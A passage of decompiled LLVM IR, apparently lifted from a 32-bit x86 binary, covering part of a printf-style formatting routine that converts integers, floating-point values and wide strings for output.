  store i1 %v7_805c237, i1* %sf.global-to-local, align 1
  store i32 %v1_805c237, i32* @esi, align 4
  br label %dec_label_pc_805c239

dec_label_pc_805c239:                             ; preds = %dec_label_pc_805c22b, %dec_label_pc_805c224, %dec_label_pc_805c237
  br label %dec_label_pc_805c23e

dec_label_pc_805c23e:                             ; preds = %dec_label_pc_805c22b, %dec_label_pc_805c239
  %storemerge = phi i32 [ 11, %dec_label_pc_805c239 ], [ 6, %dec_label_pc_805c22b ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_805c23e = add i32 %v0_805c1b4.lcssa, 20
  %v2_805c23e = inttoptr i32 %v1_805c23e to i32*
  %v3_805c23e = load i32, i32* %v2_805c23e, align 4
  %v5_805c23e = icmp slt i32 %v3_805c23e, 0
  store i1 %v5_805c23e, i1* %sf.global-to-local, align 1
  %v1_805c243 = add i32 %v0_805c1b4.lcssa, 7
  %v2_805c243 = inttoptr i32 %v1_805c243 to i8*
  store i8 32, i8* %v2_805c243, align 1
  %v0_805c248 = load i1, i1* %sf.global-to-local, align 1
  %v1_805c248 = icmp eq i1 %v0_805c248, false
  br i1 %v1_805c248, label %dec_label_pc_805c252, label %dec_label_pc_805c24a

dec_label_pc_805c24a:                             ; preds = %dec_label_pc_805c23e
  %v0_805c24a = load i32, i32* @esp, align 4
  %v1_805c24a = add i32 %v0_805c24a, 36
  %v2_805c24a = inttoptr i32 %v1_805c24a to i8*
  %v3_805c24a = load i8, i8* %v2_805c24a, align 1
  %v4_805c24a = zext i8 %v3_805c24a to i32
  %v5_805c24a = load i32, i32* %edx.global-to-local, align 4
  %v6_805c24a = and i32 %v5_805c24a, -256
  %v7_805c24a = or i32 %v6_805c24a, %v4_805c24a
  store i32 %v7_805c24a, i32* %edx.global-to-local, align 4
  %v3_805c24e = add i32 %v0_805c24a, 7
  %v4_805c24e = inttoptr i32 %v3_805c24e to i8*
  store i8 %v3_805c24a, i8* %v4_805c24e, align 1
  br label %dec_label_pc_805c252

dec_label_pc_805c252:                             ; preds = %dec_label_pc_805c23e, %dec_label_pc_805c24a
  %v1_805c252 = add i32 %v3_805c1b4, -1
  %v8_805c252 = icmp eq i32 %v1_805c252, 0
  %v9_805c252 = icmp slt i32 %v1_805c252, 0
  store i1 %v9_805c252, i1* %sf.global-to-local, align 1
  store i32 %v1_805c252, i32* %ecx.global-to-local, align 4
  %v0_805c253 = load i32, i32* @esp, align 4
  %v1_805c253 = add i32 %v0_805c253, 344
  %v2_805c253 = inttoptr i32 %v1_805c253 to i32*
  %v3_805c253 = load i32, i32* %v2_805c253, align 4
  store i32 %v3_805c253, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_805c26b.pre = load i32, i32* @edi, align 4
  br i1 %v8_805c252, label %dec_label_pc_805c26b, label %dec_label_pc_805c261

dec_label_pc_805c261:                             ; preds = %dec_label_pc_805c252
  %v2_805c261 = mul i32 %v0_805c26b.pre, 4
  %v3_805c261 = add i32 %v0_805c253, 52
  %v4_805c261 = add i32 %v3_805c261, %v2_805c261
  %v5_805c261 = inttoptr i32 %v4_805c261 to i32*
  %v6_805c261 = load i32, i32* %v5_805c261, align 4
  %v1_805c265 = and i32 %v6_805c261, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805c265, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c26b

dec_label_pc_805c26b:                             ; preds = %dec_label_pc_805c252, %dec_label_pc_805c261
  %v2_805c26b = add i32 %v0_805c253, -4
  %v3_805c26b = inttoptr i32 %v2_805c26b to i32*
  store i32 %v0_805c26b.pre, i32* %v3_805c26b, align 4
  %v0_805c26c = load i32, i32* @esi, align 4
  %v2_805c26c = add i32 %v0_805c253, -8
  %v3_805c26c = inttoptr i32 %v2_805c26c to i32*
  store i32 %v0_805c26c, i32* %v3_805c26c, align 4
  %v0_805c26d = load i32, i32* %eax.global-to-local, align 4
  %v2_805c26d = add i32 %v0_805c253, -12
  %v3_805c26d = inttoptr i32 %v2_805c26d to i32*
  store i32 %v0_805c26d, i32* %v3_805c26d, align 4
  %v0_805c26e = load i32, i32* %edx.global-to-local, align 4
  %v2_805c26e = add i32 %v0_805c253, -16
  %v3_805c26e = inttoptr i32 %v2_805c26e to i32*
  store i32 %v0_805c26e, i32* %v3_805c26e, align 4
  %v0_805c26f = call i32 @_load_inttype()
  %v0_805c274 = load i32, i32* @ebx, align 4
  %v1_805c274 = load i32, i32* @esp, align 4
  %v2_805c274 = inttoptr i32 %v1_805c274 to i32*
  store i32 %v0_805c274, i32* %v2_805c274, align 4
  %v0_805c277 = load i32, i32* @esi, align 4
  %v1_805c277 = load i32, i32* @esp, align 4
  %v2_805c277 = add i32 %v1_805c277, -4
  %v3_805c277 = inttoptr i32 %v2_805c277 to i32*
  store i32 %v0_805c277, i32* %v3_805c277, align 4
  %v0_805c278 = load i32, i32* @edx, align 4
  %v2_805c278 = add i32 %v1_805c277, -8
  %v3_805c278 = inttoptr i32 %v2_805c278 to i32*
  store i32 %v0_805c278, i32* %v3_805c278, align 4
  %v2_805c279 = add i32 %v1_805c277, -12
  %v3_805c279 = inttoptr i32 %v2_805c279 to i32*
  store i32 %v0_805c26f, i32* %v3_805c279, align 4
  %v1_805c27a = add i32 %v1_805c277, 347
  store i32 %v1_805c27a, i32* %eax.global-to-local, align 4
  %v2_805c281 = add i32 %v1_805c277, -16
  %v3_805c281 = inttoptr i32 %v2_805c281 to i32*
  store i32 %v1_805c27a, i32* %v3_805c281, align 4
  %v0_805c282 = load i32, i32* %stack_var_-364, align 4
  %v5_805c282 = inttoptr i32 %v0_805c282 to i8*
  %v6_805c282 = call i32 @_uintmaxtostr(i8* %v5_805c282, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805c282, i32* %eax.global-to-local, align 4
  %v0_805c287 = load i32, i32* @esp, align 4
  %v1_805c287 = add i32 %v0_805c287, 32
  %v1_805c28a = add i32 %v0_805c287, 80
  %v2_805c28a = inttoptr i32 %v1_805c28a to i32*
  %v3_805c28a = load i32, i32* %v2_805c28a, align 4
  %v4_805c28a = add i32 %v3_805c28a, -5
  %v8_805c28a = icmp ult i32 %v3_805c28a, 5
  %v12_805c28a = icmp eq i32 %v4_805c28a, 0
  %v13_805c28a = icmp slt i32 %v4_805c28a, 0
  store i1 %v13_805c28a, i1* %sf.global-to-local, align 1
  store i32 %v6_805c282, i32* @edi, align 4
  %v2_805c291 = or i1 %v8_805c28a, %v12_805c28a
  br i1 %v2_805c291, label %dec_label_pc_805c2bb, label %dec_label_pc_805c293

dec_label_pc_805c293:                             ; preds = %dec_label_pc_805c26b
  %v7_805c282 = inttoptr i32 %v6_805c282 to i8*
  %v3_805c293 = load i8, i8* %v7_805c282, align 1
  %v4_805c293 = add i8 %v3_805c293, -45
  %v12_805c293 = icmp eq i8 %v4_805c293, 0
  %v13_805c293 = icmp slt i8 %v4_805c293, 0
  store i1 %v13_805c293, i1* %sf.global-to-local, align 1
  %v1_805c296 = icmp eq i1 %v12_805c293, false
  %v1_805c2a5 = add i32 %v0_805c287, 64
  %v2_805c2a5 = inttoptr i32 %v1_805c2a5 to i32*
  %v3_805c2a5 = load i32, i32* %v2_805c2a5, align 4
  br i1 %v1_805c296, label %dec_label_pc_805c2a5, label %dec_label_pc_805c298

dec_label_pc_805c298:                             ; preds = %dec_label_pc_805c293
  %v4_805c298 = or i32 %v3_805c2a5, 2
  store i32 %v4_805c298, i32* %v2_805c2a5, align 4
  %v0_805c29d = load i32, i32* @edi, align 4
  %v1_805c29d = add i32 %v0_805c29d, 1
  %v9_805c29d = icmp slt i32 %v1_805c29d, 0
  store i1 %v9_805c29d, i1* %sf.global-to-local, align 1
  store i32 %v1_805c29d, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_805c2bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c2bb

dec_label_pc_805c2a5:                             ; preds = %dec_label_pc_805c293
  store i32 %v3_805c2a5, i32* %eax.global-to-local, align 4
  %v2_805c2a9 = and i32 %v3_805c2a5, 2
  %v3_805c2a9 = icmp eq i32 %v2_805c2a9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_805c2a9, label %dec_label_pc_805c2b1, label %dec_label_pc_805c2ad

dec_label_pc_805c2ad:                             ; preds = %dec_label_pc_805c2a5
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805c2bb

dec_label_pc_805c2b1:                             ; preds = %dec_label_pc_805c2a5
  %v2_805c2b1 = urem i32 %v3_805c2a5, 2
  %v3_805c2b1 = icmp eq i32 %v2_805c2b1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_805c2b8 = icmp eq i1 %v3_805c2b1, false
  %v2_805c2b8 = load i32, i32* @ebp, align 4
  %v4_805c2b8 = select i1 %v1_805c2b8, i32 4, i32 %v2_805c2b8
  store i32 %v4_805c2b8, i32* @ebp, align 4
  br label %dec_label_pc_805c2bb

dec_label_pc_805c2bb:                             ; preds = %dec_label_pc_805c26b, %dec_label_pc_805c2ad, %dec_label_pc_805c298, %dec_label_pc_805c2b1
  %v0_805c30d = phi i32 [ %v6_805c282, %dec_label_pc_805c26b ], [ %v6_805c282, %dec_label_pc_805c2ad ], [ %v1_805c29d, %dec_label_pc_805c298 ], [ %v6_805c282, %dec_label_pc_805c2b1 ]
  %v0_805c31d = phi i32 [ %v1_805c287, %dec_label_pc_805c26b ], [ %v1_805c287, %dec_label_pc_805c2ad ], [ %v0_805c2bb.pre, %dec_label_pc_805c298 ], [ %v1_805c287, %dec_label_pc_805c2b1 ]
  %v1_805c2bb = add i32 %v0_805c31d, 20
  %v2_805c2bb = inttoptr i32 %v1_805c2bb to i32*
  %v3_805c2bb = load i32, i32* %v2_805c2bb, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805c2bf = sub i32 204, %v0_805c30d
  %v2_805c2cb = add i32 %v1_805c2bf, %v0_805c31d
  %v1_805c2cd = add i32 %v2_805c2cb, 127
  store i32 %v1_805c2cd, i32* @esi, align 4
  %v2_805c2d0 = icmp slt i32 %v3_805c2bb, 0
  store i1 %v2_805c2d0, i1* %sf.global-to-local, align 1
  %v3_805c2d2 = select i1 %v2_805c2d0, i32 1, i32 %v3_805c2bb
  store i32 %v3_805c2d2, i32* %ecx.global-to-local, align 4
  %v1_805c2d5 = add i32 %v0_805c31d, 32
  %v2_805c2d5 = inttoptr i32 %v1_805c2d5 to i8*
  %v3_805c2d5 = load i8, i8* %v2_805c2d5, align 1
  %v4_805c2d5 = and i8 %v3_805c2d5, 16
  %v5_805c2d5 = icmp eq i8 %v4_805c2d5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_805c2d5, label %dec_label_pc_805c30d, label %dec_label_pc_805c2dc

dec_label_pc_805c2dc:                             ; preds = %dec_label_pc_805c2bb
  %v1_805c2dc = add i32 %v0_805c31d, 48
  %v2_805c2dc = inttoptr i32 %v1_805c2dc to i32*
  %v3_805c2dc = load i32, i32* %v2_805c2dc, align 4
  store i32 %v3_805c2dc, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v3_805c2dc, 3
  %v3_805c2e5 = load i32, i32* @ebp, align 4
  %v5_805c2e5 = select i1 %tmp70, i32 6, i32 %v3_805c2e5
  store i32 %v5_805c2e5, i32* @ebp, align 4
  %v1_805c2e8 = add i32 %v3_805c2dc, -3
  %v9_805c2e8 = icmp eq i32 %v1_805c2e8, 0
  %v10_805c2e8 = icmp slt i32 %v1_805c2e8, 0
  store i1 %v10_805c2e8, i1* %sf.global-to-local, align 1
  %v1_805c2eb = icmp eq i1 %v9_805c2e8, false
  br i1 %v1_805c2eb, label %dec_label_pc_805c2f4, label %dec_label_pc_805c2ed

dec_label_pc_805c2ed:                             ; preds = %dec_label_pc_805c2dc
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_805c30d

dec_label_pc_805c2f4:                             ; preds = %dec_label_pc_805c2dc
  %v1_805c2f4 = add i32 %v3_805c2dc, -4
  %v9_805c2f4 = icmp eq i32 %v1_805c2f4, 0
  %v10_805c2f4 = icmp slt i32 %v1_805c2f4, 0
  store i1 %v10_805c2f4, i1* %sf.global-to-local, align 1
  %v1_805c2f7 = icmp eq i1 %v9_805c2f4, false
  br i1 %v1_805c2f7, label %dec_label_pc_805c30d, label %dec_label_pc_805c2f9

dec_label_pc_805c2f9:                             ; preds = %dec_label_pc_805c2f4
  %v2_805c2f9 = sub i32 %v3_805c2d2, %v1_805c2cd
  %v7_805c2f9 = icmp ult i32 %v3_805c2d2, %v1_805c2cd
  %v12_805c2f9 = icmp eq i32 %v2_805c2f9, 0
  %v13_805c2f9 = icmp slt i32 %v2_805c2f9, 0
  store i1 %v13_805c2f9, i1* %sf.global-to-local, align 1
  %v2_805c2fb = or i1 %v7_805c2f9, %v12_805c2f9
  br i1 %v2_805c2fb, label %dec_label_pc_805c2fd, label %dec_label_pc_805c30d

dec_label_pc_805c2fd:                             ; preds = %dec_label_pc_805c2f9
  %v1_805c2fd = inttoptr i32 %v0_805c30d to i8*
  %v2_805c2fd = load i8, i8* %v1_805c2fd, align 1
  %v3_805c2fd = add i8 %v2_805c2fd, -48
  %v8_805c2fd = icmp eq i8 %v3_805c2fd, 0
  %v9_805c2fd = icmp slt i8 %v3_805c2fd, 0
  store i1 %v9_805c2fd, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_805c2fd, label %dec_label_pc_805c30d, label %dec_label_pc_805c307

dec_label_pc_805c307:                             ; preds = %dec_label_pc_805c2fd
  %v1_805c307 = add i32 %v2_805c2cb, 128
  store i32 %v1_805c307, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805c30d

dec_label_pc_805c30d:                             ; preds = %dec_label_pc_805c2f9, %dec_label_pc_805c2fd, %dec_label_pc_805c2f4, %dec_label_pc_805c2bb, %dec_label_pc_805c2ed, %dec_label_pc_805c307
  %v0_805c346 = phi i32 [ %v3_805c2d2, %dec_label_pc_805c2f9 ], [ 1, %dec_label_pc_805c2fd ], [ %v3_805c2d2, %dec_label_pc_805c2f4 ], [ %v3_805c2d2, %dec_label_pc_805c2bb ], [ %v3_805c2d2, %dec_label_pc_805c2ed ], [ %v1_805c307, %dec_label_pc_805c307 ]
  %v1_805c30d = inttoptr i32 %v0_805c30d to i8*
  %v2_805c30d = load i8, i8* %v1_805c30d, align 1
  %v3_805c30d = add i8 %v2_805c30d, -48
  %v8_805c30d = icmp eq i8 %v3_805c30d, 0
  %v9_805c30d = icmp slt i8 %v3_805c30d, 0
  store i1 %v9_805c30d, i1* %sf.global-to-local, align 1
  %v1_805c310 = icmp eq i1 %v8_805c30d, false
  br i1 %v1_805c310, label %dec_label_pc_805c33e, label %dec_label_pc_805c312

dec_label_pc_805c312:                             ; preds = %dec_label_pc_805c30d
  %v0_805c312 = load i32, i32* @ebp, align 4
  %v1_805c312 = add i32 %v0_805c312, -6
  %v6_805c312 = sub i32 5, %v0_805c312
  %v7_805c312 = and i32 %v6_805c312, %v0_805c312
  %v8_805c312 = icmp slt i32 %v7_805c312, 0
  %v10_805c312 = icmp slt i32 %v1_805c312, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_805c31a = icmp eq i1 %v10_805c312, %v8_805c312
  %v5_805c31a = select i1 %v2_805c31a, i32 11, i32 %v0_805c312
  store i32 %v5_805c31a, i32* @ebp, align 4
  %v1_805c31d = add i32 %v0_805c31d, 48
  %v2_805c31d = inttoptr i32 %v1_805c31d to i32*
  %v3_805c31d = load i32, i32* %v2_805c31d, align 4
  %v4_805c31d = add i32 %v3_805c31d, -1
  %v12_805c31d = icmp eq i32 %v4_805c31d, 0
  %v13_805c31d = icmp slt i32 %v4_805c31d, 0
  store i1 %v13_805c31d, i1* %sf.global-to-local, align 1
  %v1_805c322 = icmp eq i1 %v12_805c31d, false
  br i1 %v1_805c322, label %dec_label_pc_805c333, label %dec_label_pc_805c324

dec_label_pc_805c324:                             ; preds = %dec_label_pc_805c312
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_806da0c.693 to i32), i32* @edi, align 4
  br label %dec_label_pc_805c4bd

dec_label_pc_805c333:                             ; preds = %dec_label_pc_805c312
  %v1_805c333 = icmp eq i32 %v0_805c346, 0
  %v2_805c333 = icmp slt i32 %v0_805c346, 0
  store i1 %v2_805c333, i1* %sf.global-to-local, align 1
  %v1_805c335 = icmp eq i1 %v1_805c333, false
  br i1 %v1_805c335, label %dec_label_pc_805c33e, label %dec_label_pc_805c337

dec_label_pc_805c337:                             ; preds = %dec_label_pc_805c333
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805c4bd

dec_label_pc_805c33e:                             ; preds = %dec_label_pc_805c333, %dec_label_pc_805c30d
  %v2_805c33e = sub i32 %v0_805c346, %v1_805c2cd
  %v7_805c33e = icmp ult i32 %v0_805c346, %v1_805c2cd
  %v12_805c33e = icmp eq i32 %v2_805c33e, 0
  %v13_805c33e = icmp slt i32 %v2_805c33e, 0
  store i1 %v13_805c33e, i1* %sf.global-to-local, align 1
  %v2_805c340 = or i1 %v7_805c33e, %v12_805c33e
  br i1 %v2_805c340, label %dec_label_pc_805c4bd, label %dec_label_pc_805c346

dec_label_pc_805c346:                             ; preds = %dec_label_pc_805c33e
  store i1 %v13_805c33e, i1* %sf.global-to-local, align 1
  store i32 %v2_805c33e, i32* @ebx, align 4
  br label %dec_label_pc_805c4d7

dec_label_pc_805c34f:                             ; preds = %dec_label_pc_805c1e2
  %v1_805c34f = add i32 %v3_805c1b4, -15
  %v5_805c34f = icmp ult i32 %v3_805c1b4, 15
  %v9_805c34f = icmp eq i32 %v1_805c34f, 0
  %v10_805c34f = icmp slt i32 %v1_805c34f, 0
  store i1 %v10_805c34f, i1* %sf.global-to-local, align 1
  %v2_805c352 = or i1 %v5_805c34f, %v9_805c34f
  br i1 %v2_805c352, label %dec_label_pc_805c354, label %dec_label_pc_805c399

dec_label_pc_805c354:                             ; preds = %dec_label_pc_805c34f
  %v1_805c354 = add i32 %v0_805c1b4.lcssa, 33
  %v2_805c354 = inttoptr i32 %v1_805c354 to i8*
  %v3_805c354 = load i8, i8* %v2_805c354, align 1
  %v4_805c354 = and i8 %v3_805c354, 8
  %v5_805c354 = icmp eq i8 %v4_805c354, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805c359 = add i32 %v0_805c1b4.lcssa, 344
  %v2_805c359 = inttoptr i32 %v1_805c359 to i32*
  %v3_805c359 = load i32, i32* %v2_805c359, align 4
  store i32 %v3_805c359, i32* %edx.global-to-local, align 4
  br i1 %v5_805c354, label %dec_label_pc_805c366, label %dec_label_pc_805c362

dec_label_pc_805c362:                             ; preds = %dec_label_pc_805c354
  %v1_805c362 = inttoptr i32 %v3_805c359 to x86_fp80*
  %v2_805c362 = load x86_fp80, x86_fp80* %v1_805c362, align 4
  br label %dec_label_pc_805c368

dec_label_pc_805c366:                             ; preds = %dec_label_pc_805c354
  %v1_805c366 = inttoptr i32 %v3_805c359 to double*
  %v2_805c366 = load double, double* %v1_805c366, align 4
  %v3_805c366 = fpext double %v2_805c366 to x86_fp80
  br label %dec_label_pc_805c368

dec_label_pc_805c368:                             ; preds = %dec_label_pc_805c362, %dec_label_pc_805c366
  %storemerge5 = phi x86_fp80 [ %v2_805c362, %dec_label_pc_805c362 ], [ %v3_805c366, %dec_label_pc_805c366 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_805c368 = load i32, i32* @esi, align 4
  %v2_805c368 = add i32 %v0_805c1b4.lcssa, -4
  %v3_805c368 = inttoptr i32 %v2_805c368 to i32*
  store i32 %v0_805c368, i32* %v3_805c368, align 4
  %v0_805c369 = load i32, i32* @esi, align 4
  %v2_805c369 = add i32 %v0_805c1b4.lcssa, -8
  %v3_805c369 = inttoptr i32 %v2_805c369 to i32*
  store i32 %v0_805c369, i32* %v3_805c369, align 4
  %v1_805c36a = add i32 %v0_805c1b4.lcssa, -12
  %v2_805c36a = inttoptr i32 %v1_805c36a to i32*
  store i32 134594602, i32* %v2_805c36a, align 4
  %v1_805c36f = add i32 %v0_805c1b4.lcssa, 20
  store i32 %v1_805c36f, i32* %eax.global-to-local, align 4
  %v2_805c373 = add i32 %v0_805c1b4.lcssa, -16
  %v3_805c373 = inttoptr i32 %v2_805c373 to i32*
  store i32 %v1_805c36f, i32* %v3_805c373, align 4
  %v1_805c374 = add i32 %v0_805c1b4.lcssa, -28
  %v10_805c374 = icmp slt i32 %v1_805c374, 0
  store i1 %v10_805c374, i1* %sf.global-to-local, align 1
  %v1_805c377 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805c377 = inttoptr i32 %v1_805c374 to x86_fp80*
  store x86_fp80 %v1_805c377, x86_fp80* %v3_805c377, align 4
  %v1_805c37a = add i32 %v0_805c1b4.lcssa, 368
  %v2_805c37a = inttoptr i32 %v1_805c37a to i32*
  %v3_805c37a = load i32, i32* %v2_805c37a, align 4
  %v5_805c37a = add i32 %v0_805c1b4.lcssa, -32
  %v6_805c37a = inttoptr i32 %v5_805c37a to i32*
  store i32 %v3_805c37a, i32* %v6_805c37a, align 4
  %v0_805c381 = call i32 @_fpmaxtostr()
  store i32 %v0_805c381, i32* %eax.global-to-local, align 4
  %v0_805c386 = load i32, i32* @esp, align 4
  %v1_805c386 = add i32 %v0_805c386, 32
  %v2_805c389 = icmp slt i32 %v0_805c381, 0
  store i1 %v2_805c389, i1* %sf.global-to-local, align 1
  br i1 %v2_805c389, label %dec_label_pc_805c637, label %dec_label_pc_805c391

dec_label_pc_805c391:                             ; preds = %dec_label_pc_805c368
  %v1_805c391 = inttoptr i32 %v1_805c386 to i32*
  %v2_805c391 = load i32, i32* %v1_805c391, align 4
  %v4_805c391 = add i32 %v2_805c391, %v0_805c381
  %v15_805c391 = icmp slt i32 %v4_805c391, 0
  store i1 %v15_805c391, i1* %sf.global-to-local, align 1
  store i32 %v4_805c391, i32* %v1_805c391, align 4
  %v0_805c624.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c624

dec_label_pc_805c399:                             ; preds = %dec_label_pc_805c34f
  %v1_805c399 = add i32 %v3_805c1b4, -17
  %v5_805c399 = icmp ult i32 %v3_805c1b4, 17
  %v9_805c399 = icmp eq i32 %v1_805c399, 0
  %v10_805c399 = icmp slt i32 %v1_805c399, 0
  store i1 %v10_805c399, i1* %sf.global-to-local, align 1
  %v2_805c39c = or i1 %v5_805c399, %v9_805c399
  br i1 %v2_805c39c, label %dec_label_pc_805c3a2, label %dec_label_pc_805c436

dec_label_pc_805c3a2:                             ; preds = %dec_label_pc_805c399
  %v1_805c3a2 = add i32 %v0_805c1b4.lcssa, 332
  %v2_805c3a2 = inttoptr i32 %v1_805c3a2 to i32*
  store i32 0, i32* %v2_805c3a2, align 4
  %v0_805c3ad = load i32, i32* @esp, align 4
  %v1_805c3ad = add i32 %v0_805c3ad, 344
  %v2_805c3ad = inttoptr i32 %v1_805c3ad to i32*
  %v3_805c3ad = load i32, i32* %v2_805c3ad, align 4
  store i32 %v3_805c3ad, i32* %edx.global-to-local, align 4
  %v1_805c3b4 = icmp eq i1 %v9_805c399, false
  br i1 %v1_805c3b4, label %dec_label_pc_805c406, label %dec_label_pc_805c3b6

dec_label_pc_805c3b6:                             ; preds = %dec_label_pc_805c3a2
  %v1_805c3b6 = inttoptr i32 %v3_805c3ad to i32*
  %v2_805c3b6 = load i32, i32* %v1_805c3b6, align 4
  store i32 %v2_805c3b6, i32* %eax.global-to-local, align 4
  %v1_805c3b8 = icmp eq i32 %v2_805c3b6, 0
  %v2_805c3b8 = icmp slt i32 %v2_805c3b6, 0
  store i1 %v2_805c3b8, i1* %sf.global-to-local, align 1
  %v2_805c3ba = add i32 %v0_805c3ad, 340
  %v3_805c3ba = inttoptr i32 %v2_805c3ba to i32*
  store i32 %v2_805c3b6, i32* %v3_805c3ba, align 4
  br i1 %v1_805c3b8, label %dec_label_pc_805c4c1, label %dec_label_pc_805c3c7

dec_label_pc_805c3c7:                             ; preds = %dec_label_pc_805c3b6
  %v0_805c3c7 = load i32, i32* @esp, align 4
  %v1_805c3c7 = add i32 %v0_805c3c7, 20
  %v2_805c3c7 = inttoptr i32 %v1_805c3c7 to i32*
  %v3_805c3c7 = load i32, i32* %v2_805c3c7, align 4
  %v1_805c3ce = add i32 %v0_805c3c7, 340
  store i32 %v1_805c3ce, i32* %ecx.global-to-local, align 4
  %v2_805c3d5 = icmp slt i32 %v3_805c3c7, 0
  store i1 %v2_805c3d5, i1* %sf.global-to-local, align 1
  %v1_805c3d7 = icmp eq i1 %v2_805c3d5, false
  %v4_805c3d7 = select i1 %v1_805c3d7, i32 %v3_805c3c7, i32 -1
  store i32 %v4_805c3d7, i32* %edx.global-to-local, align 4
  %v1_805c3da = add i32 %v0_805c3c7, 332
  store i32 %v1_805c3da, i32* %eax.global-to-local, align 4
  %v2_805c3e1 = add i32 %v0_805c3c7, -4
  %v3_805c3e1 = inttoptr i32 %v2_805c3e1 to i32*
  store i32 %v1_805c3da, i32* %v3_805c3e1, align 4
  %v0_805c3e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_805c3e2 = add i32 %v0_805c3c7, -8
  %v3_805c3e2 = inttoptr i32 %v2_805c3e2 to i32*
  store i32 %v0_805c3e2, i32* %v3_805c3e2, align 4
  %v0_805c3e3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805c3e3 = add i32 %v0_805c3c7, -12
  %v3_805c3e3 = inttoptr i32 %v2_805c3e3 to i32*
  store i32 %v0_805c3e3, i32* %v3_805c3e3, align 4
  %v0_805c3e4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805c3e4 = add i32 %v0_805c3c7, -16
  %v3_805c3e4 = inttoptr i32 %v2_805c3e4 to i32*
  store i32 %v0_805c3e4, i32* %v3_805c3e4, align 4
  %v0_805c3e5 = call i32 @__GI_wcsrtombs()
  store i32 %v0_805c3e5, i32* %eax.global-to-local, align 4
  %v0_805c3ea = load i32, i32* @esp, align 4
  %v1_805c3ea = add i32 %v0_805c3ea, 16
  %v1_805c3ed = add i32 %v0_805c3e5, 1
  %v10_805c3ed = icmp eq i32 %v1_805c3ed, 0
  %v11_805c3ed = icmp slt i32 %v1_805c3ed, 0
  store i1 %v11_805c3ed, i1* %sf.global-to-local, align 1
  store i32 %v0_805c3e5, i32* @esi, align 4
  br i1 %v10_805c3ed, label %dec_label_pc_805c637, label %dec_label_pc_805c3f8

dec_label_pc_805c3f8:                             ; preds = %dec_label_pc_805c3c7
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805c4d2

dec_label_pc_805c406:                             ; preds = %dec_label_pc_805c3a2
  %v0_805c406 = load i32, i32* @ebx, align 4
  %v2_805c406 = add i32 %v0_805c3ad, -4
  %v3_805c406 = inttoptr i32 %v2_805c406 to i32*
  store i32 %v0_805c406, i32* %v3_805c406, align 4
  %v1_805c407 = add i32 %v0_805c3ad, 332
  store i32 %v1_805c407, i32* %eax.global-to-local, align 4
  %v2_805c40e = add i32 %v0_805c3ad, -8
  %v3_805c40e = inttoptr i32 %v2_805c40e to i32*
  store i32 %v1_805c407, i32* %v3_805c40e, align 4
  %v0_805c40f = load i32, i32* %edx.global-to-local, align 4
  %v1_805c40f = inttoptr i32 %v0_805c40f to i32*
  %v2_805c40f = load i32, i32* %v1_805c40f, align 4
  %v4_805c40f = add i32 %v0_805c3ad, -12
  %v5_805c40f = inttoptr i32 %v4_805c40f to i32*
  store i32 %v2_805c40f, i32* %v5_805c40f, align 4
  %v1_805c411 = add i32 %v0_805c3ad, 204
  store i32 %v1_805c411, i32* @edi, align 4
  %v2_805c418 = add i32 %v0_805c3ad, -16
  %v3_805c418 = inttoptr i32 %v2_805c418 to i32*
  store i32 %v1_805c411, i32* %v3_805c418, align 4
  %v0_805c419 = call i32 @__GI_wcrtomb()
  store i32 %v0_805c419, i32* %eax.global-to-local, align 4
  %v0_805c41e = load i32, i32* @esp, align 4
  %v1_805c41e = add i32 %v0_805c41e, 16
  %v1_805c421 = add i32 %v0_805c419, 1
  %v10_805c421 = icmp eq i32 %v1_805c421, 0
  %v11_805c421 = icmp slt i32 %v1_805c421, 0
  store i1 %v11_805c421, i1* %sf.global-to-local, align 1
  store i32 %v0_805c419, i32* @esi, align 4
  br i1 %v10_805c421, label %dec_label_pc_805c637, label %dec_label_pc_805c42c

dec_label_pc_805c42c:                             ; preds = %dec_label_pc_805c406
  %v2_805c42c = add i32 %v0_805c419, 220
  %v3_805c42c = add i32 %v2_805c42c, %v0_805c41e
  %v4_805c42c = inttoptr i32 %v3_805c42c to i8*
  store i8 0, i8* %v4_805c42c, align 1
  br label %dec_label_pc_805c464

dec_label_pc_805c436:                             ; preds = %dec_label_pc_805c399
  %v1_805c436 = add i32 %v3_805c1b4, -19
  %v5_805c436 = icmp ult i32 %v3_805c1b4, 19
  %v9_805c436 = icmp eq i32 %v1_805c436, 0
  %v10_805c436 = icmp slt i32 %v1_805c436, 0
  store i1 %v10_805c436, i1* %sf.global-to-local, align 1
  %v2_805c439 = or i1 %v5_805c436, %v9_805c436
